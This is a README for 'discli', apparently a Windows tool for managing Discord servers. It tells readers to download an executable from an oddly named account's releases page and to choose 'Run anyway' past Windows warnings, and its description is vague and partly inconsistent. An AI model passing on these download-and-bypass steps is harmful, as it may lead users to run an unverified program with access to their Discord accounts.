# 🤖 discli - Manage Discord with simple commands

[⬇️ Download discli](https://github.com/liquidbleachjourneying419/discli/releases)

## 🚀 What discli does

discli is a command line tool for Discord server management.

It helps you work with:

- Channels
- Roles
- Permissions
- Messages
- Embeds
- Files
- Emojis
- Invites
- Audit logs

You can use it on Windows without running a bot server. Each command maps to one API call, so it stays direct and easy to follow.

## 📥 Download and set up on Windows

1. Open the [discli releases page](https://github.com/liquidbleachjourneying419/discli/releases)
2. Download the latest Windows file from the release list
3. Save the file to a folder you can find again, such as `Downloads` or `Desktop`
4. If the file is a `.zip`, right-click it and choose **Extract All**
5. Open the extracted folder
6. Double-click the `discli.exe` file, or open it from Command Prompt if the release includes a terminal build
7. If Windows asks for permission, choose **Run anyway** if you trust the file source

## 🖥️ What you need

discli is built for Windows desktop use.

A typical setup works well with:

- Windows 10 or Windows 11
- An active Discord account
- A Discord server where you have permission to manage settings
- A stable internet connection
- Enough space to store the app files and any logs you want to keep

## 🔐 Before you start

You need access to the Discord server you want to manage.

Make sure you have:

- Permission to manage channels or roles
- Permission to view audit logs if you plan to check activity
- Permission to send messages if you plan to post or edit content
- Permission to manage invites if you want to create or remove invite links

If you do not have the right permissions, Discord will block the action.

## 🧭 Basic setup flow

After you download the app:

1. Open discli
2. Sign in or connect it with your Discord account in the way shown by the app
3. Choose the server you want to manage
4. Pick the task you want to run
5. Review the command before you send it
6. Confirm the action

This keeps each change clear and easy to track.

## ⚙️ Common tasks

### Channel management

Use discli to:

- Create channels
- Rename channels
- Move channels
- Change channel settings
- Remove channels you no longer need

This is useful when you want to keep a server neat and easy to use.

### Role management

Use discli to:

- Create roles
- Rename roles
- Set role colors
- Assign roles to members
- Remove roles you no longer use

Roles help you control access and organize members.

### Permission control

Use discli to:

- Set who can read a channel
- Set who can post messages
- Set who can manage content
- Adjust access for roles and members

This is useful when a server needs clear access rules.

### Messages and embeds

Use discli to:

- Send messages
- Edit messages
- Remove messages
- Post embeds with structured content

Embeds are helpful for rules, updates, and announcements.

### Files and emojis

Use discli to:

- Upload files
- Attach images
- Manage emojis
- Add or remove emoji entries where allowed

This helps when you want to keep a server easy to use and easy to read.

### Invites and audit logs

Use discli to:

- Create invite links
- Remove invite links
- Check recent actions in audit logs

This helps you track changes and manage server access.
